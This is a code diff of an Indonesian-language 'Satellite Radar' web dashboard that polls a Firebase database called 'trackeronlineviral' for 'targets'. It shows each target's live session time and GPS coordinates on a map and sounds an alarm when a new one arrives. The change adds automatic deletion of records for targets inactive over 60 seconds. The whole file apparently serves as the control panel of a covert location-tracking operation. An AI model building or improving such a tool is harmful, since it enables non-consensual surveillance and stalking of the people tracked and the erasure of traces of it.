@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Real-Time Command Center</title>
+    <title>Real-Time Command Center v5.0</title>
     <style>
         body { font-family: 'Courier New', monospace; background: #050505; color: #00ff41; padding: 20px; margin: 0; }
         .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #00ff41; padding-bottom: 10px; margin-bottom: 20px; }
@@ -14,15 +14,15 @@
         .map-box { height: 400px; background: #000; border: 1px solid #00ff41; margin-top: 15px; }
         iframe { width: 100%; height: 100%; border: none; filter: invert(90%) hue-rotate(180deg); }
         .session-time { color: #fbbf24; font-weight: bold; }
-        .new-target-alert { animation: flash 0.5s infinite; }
-        @keyframes flash { 0% { color: #00ff41; } 50% { color: #fff; } 100% { color: #00ff41; } }
+        .status-active { color: #00ff41; font-weight: bold; }
+        .status-cleaning { color: #ff4141; font-size: 10px; font-style: italic; }
     </style>
 </head>
 <body>
 
 <div class="header">
-    <h1>SATELLITE RADAR v4.0</h1>
-    <div id="connection-status">SISTEM AKTIF</div>
+    <h1>SATELLITE RADAR [AUTO-CLEAN MODE]</h1>
+    <div id="stats">Target: 0</div>
 </div>
 
 <div class="grid">
@@ -44,7 +44,7 @@
 
     <div class="card">
         <h3>VISUALISASI LOKASI</h3>
-        <div id="detailInfo">Pilih target untuk melacak...</div>
+        <div id="detailInfo">Menunggu data...</div>
         <div class="map-box" id="mapBox"></div>
     </div>
 </div>
@@ -52,7 +52,7 @@
 <audio id="alarmSound" src="https://www.soundjay.com/buttons/beep-07a.mp3"></audio>
 
 <script>
-    const DB_URL = "https://trackeronlineviral-default-rtdb.asia-southeast1.firebasedatabase.app/targets.json";
+    const BASE_DB_URL = "https://trackeronlineviral-default-rtdb.asia-southeast1.firebasedatabase.app/targets";
     let knownTargets = new Set();
 
     function formatDuration(startTime) {
@@ -63,18 +63,42 @@
         return `${h}j ${m}m ${s}d`;
     }
 
+    // FUNGSI PEMBERSIH OTOMATIS
+    async function cleanInactiveTargets(id, lastUpdate) {
+        const now = Date.now();
+        const inactiveTime = (now - lastUpdate) / 1000; // dalam detik
+
+        if (inactiveTime > 60) { // JIKA TIDAK AKTIF LEBIH DARI 60 DETIK
+            console.log(`Membersihkan target: ${id}`);
+            await fetch(`${BASE_DB_URL}/${id}.json`, { method: 'DELETE' });
+            knownTargets.delete(id);
+            return true;
+        }
+        return false;
+    }
+
     function updateDashboard() {
-        fetch(DB_URL)
+        fetch(`${BASE_DB_URL}.json`)
         .then(res => res.json())
-        .then(data => {
+        .then(async (data) => {
             const tbody = document.getElementById('targetList');
-            if (!data) { tbody.innerHTML = "<tr><td colspan='5'>Menunggu target...</td></tr>"; return; }
+            if (!data) { 
+                tbody.innerHTML = "<tr><td colspan='5'>Tidak ada target aktif.</td></tr>"; 
+                document.getElementById('stats').innerText = "Target: 0";
+                return; 
+            }
 
             let currentHTML = "";
+            let count = 0;
+
             for (let id in data) {
                 const t = data[id];
                 
-                // Alarm jika ada target baru
+                // Cek apakah perlu dibersihkan
+                const isDeleted = await cleanInactiveTargets(id, t.updated_at);
+                if (isDeleted) continue; 
+
+                count++;
                 if (!knownTargets.has(id)) {
                     document.getElementById('alarmSound').play().catch(()=>{});
                     knownTargets.add(id);
@@ -91,17 +115,16 @@
                 `;
             }
             tbody.innerHTML = currentHTML;
+            document.getElementById('stats').innerText = `Target: ${count}`;
         });
     }
 
     function showMap(lat, lon) {
         const mapURL = `https://maps.google.com/maps?q=${lat},${lon}&t=&z=16&ie=UTF8&iwloc=&output=embed`;
         document.getElementById('mapBox').innerHTML = `<iframe src="${mapURL}"></iframe>`;
-        document.getElementById('detailInfo').innerText = `Koordinat: ${lat}, ${lon}`;
     }
 
-    // Update setiap 1 detik agar hitungan sesi terlihat real-time
-    setInterval(updateDashboard, 1000);
+    setInterval(updateDashboard, 2000);
     window.onload = updateDashboard;
 </script>
 </body>
